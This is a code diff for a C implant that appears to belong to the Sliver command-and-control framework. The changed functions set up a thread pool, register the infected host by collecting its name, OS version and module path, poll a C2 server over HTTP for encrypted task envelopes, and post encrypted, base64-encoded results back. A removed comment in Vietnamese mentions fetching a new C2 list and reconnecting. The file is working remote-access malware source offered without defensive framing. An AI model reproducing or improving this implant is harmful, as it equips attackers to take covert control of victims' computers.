@@ -32,22 +32,18 @@ VOID FreeSliverThreadPool
 	}
 }
 
-PSLIVER_THREADPOOL InitilizeSliverThreadPool()
+PSLIVER_THREADPOOL InitializeSliverThreadPool()
 {
-	DWORD dwCurrentProcessorNumber = 0;
 	PSLIVER_THREADPOOL pResult = NULL;
-	
+	PTP_CLEANUP_GROUP pCleanupGroup = NULL;
+
 	pResult = ALLOC(sizeof(SLIVER_THREADPOOL));
 	pResult->pPool = CreateThreadpool(NULL);
-	dwCurrentProcessorNumber = GetCurrentProcessorNumber();
-	SetThreadpoolThreadMaximum(pResult->pPool, dwCurrentProcessorNumber);
-	if (!SetThreadpoolThreadMinimum(pResult->pPool, dwCurrentProcessorNumber)) {
-		LogError(L"SetThreadpoolThreadMinimum failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
-		FreeSliverThreadPool(pResult);
-		return NULL;
-	}
-
+	SetThreadpoolThreadMaximum(pResult->pPool, 8);
 	SetThreadpoolCallbackPool(&pResult->CallBackEnviron, pResult->pPool);
+	pCleanupGroup = CreateThreadpoolCleanupGroup();
+	SetThreadpoolCallbackCleanupGroup(&pResult->CallBackEnviron, pCleanupGroup, NULL);
+
 	return pResult;
 }
 
@@ -102,7 +98,7 @@ PBYTE RegisterSliver
 
 	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
 	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
-	if (!GetVersionInfo(&OsVersion)) {
+	if (!GetOsVersion(&OsVersion)) {
 		LogError(L"ConvertSidToStringSidA failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
@@ -122,7 +118,6 @@ PBYTE RegisterSliver
 	else {
 		lpArch = DuplicateStrA("(NULL)", 0);
 	}
-
 
 	lpHostName = GetHostName();
 	lpModulePath = ALLOC(cbModulePath + 1);
@@ -292,45 +287,37 @@ VOID SessionMainLoop
 	PTP_WORK pWork = NULL;
 	PENVELOPE_WRAPPER pWrapper = NULL;
 
-	pSliverPool = InitilizeSliverThreadPool();
+	pSliverPool = InitializeSliverThreadPool();
 	if (pSliverPool == NULL) {
 		goto CLEANUP;
 	}
 
-	pWrapper = ALLOC(sizeof(ENVELOPE_WRAPPER));
-	pWrapper->pSliverClient = pSliverClient;
 	pSliverClient->dwPollTimeout = 30;
 	while (TRUE) {
 		pSliverClient->HttpConfig.dwSendTimeout = pSliverClient->dwPollTimeout * 1000;
 		pEnvelope = ReadEnvelope(pSliverClient);
-		if (pEnvelope != NULL) {
-			if (!InternetCheckConnectionW(L"https://learn.microsoft.com", 0, NULL)) {
-				goto CLEANUP;
-			}
-			else {
-				// Lay danh sach C2 moi tai day va tien hanh connect lai
-			}
+		if (pEnvelope == NULL) {
+			Sleep(pSliverClient->dwPollInterval * 1000);
+			continue;
 		}
 
+		wprintf(L"Receive Envelope:\n");
+		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
+		pWrapper = ALLOC(sizeof(ENVELOPE_WRAPPER));
+		pWrapper->pSliverClient = pSliverClient;
 		pWrapper->pEnvelope = pEnvelope;
 		pWork = CreateThreadpoolWork(MainHandler, pWrapper, &pSliverPool->CallBackEnviron);
 		if (pWork == NULL) {
-			LogError(L"Process32FirstW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+			LogError(L"CreateThreadpoolWork failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 			goto CLEANUP;
 		}
 
 		SubmitThreadpoolWork(pWork);
-		FreeEnvelope(pEnvelope);
-		pEnvelope = NULL;
 		Sleep(pSliverClient->dwPollInterval * 1000);
 	}
 
 CLEANUP:
-	FreeEnvelope(pEnvelope);
 	FreeSliverThreadPool(pSliverPool);
-	if (pWrapper != NULL) {
-		FREE(pWrapper);
-	}
 
 	return;
 }
@@ -352,6 +339,7 @@ BOOL WriteEnvelope
 
 	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
 	pCipherText = SessionEncrypt(pSliverClient, pMarshalledEnvelope->pBuffer, pMarshalledEnvelope->cbBuffer, &cbCipherText);
+	
 	lpUri = CreateSessionURL(pSliverClient);
 	if (lpUri == NULL) {
 		goto CLEANUP;
@@ -364,7 +352,7 @@ BOOL WriteEnvelope
 
 	lpEncodedData = SliverBase64Encode(pCipherText, cbCipherText);
 	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, POST, NULL, lpEncodedData, lstrlenA(lpEncodedData), FALSE, FALSE);
-	if (pResp == NULL || pResp->dwStatusCode != HTTP_STATUS_OK) {
+	if (pResp == NULL || (pResp->dwStatusCode != HTTP_STATUS_OK && pResp->dwStatusCode != HTTP_STATUS_ACCEPTED)) {
 		goto CLEANUP;
 	}
 
@@ -410,6 +398,10 @@ PENVELOPE ReadEnvelope
 
 	pUri = UriInit(lpUri);
 	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, GET, NULL, NULL, 0, FALSE, TRUE);
+	if (pResp->dwStatusCode == HTTP_STATUS_NO_CONTENT) {
+		goto CLEANUP;
+	}
+
 	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
